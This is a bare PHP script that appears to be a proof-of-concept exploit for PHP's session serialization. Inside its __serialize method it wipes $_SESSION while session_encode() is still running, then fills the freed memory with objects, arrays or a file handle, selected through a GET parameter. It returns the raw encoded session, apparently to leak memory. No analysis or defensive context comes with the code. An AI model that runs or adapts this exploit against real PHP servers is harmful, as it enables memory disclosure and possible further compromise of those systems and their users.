<?php
error_reporting(0);
ini_set('session.serialize_handler', 'php_serialize');
$mode = $_GET['mode'] ?? 'obj';
class C {
    public $mode;
    function __construct($m){ $this->mode = $m; }
    function __serialize() {
        $_SESSION = [];
        $ref = [0x41424344, 0x45464748];
        $GLOBALS['keepref'] =& $ref;
        if ($this->mode === 'obj') {
            $objs = [];
            for ($i=0;$i<12;$i++) $objs[] = new stdClass();
            $GLOBALS['objs'] = $objs;
        } elseif ($this->mode === 'arr') {
            $arrs = [];
            for ($i=0;$i<12;$i++) $arrs[] = [1,2,3,4,5];
            $GLOBALS['arrs'] = $arrs;
        } elseif ($this->mode === 'file') {
            $GLOBALS['f'] = fopen('/tmp/leakfile', 'w');
            fwrite($GLOBALS['f'], str_repeat('F', 64));
        }
        return [];
    }
}
session_start();
$_SESSION['Lz'] = new C($mode);
$_SESSION['s'] = str_repeat('A', 7);
for ($i = 0; $i < 8; $i++) { $_SESSION['k'.$i] = $i; }
$s = session_encode();
header('Content-Type: application/octet-stream');
echo $s;
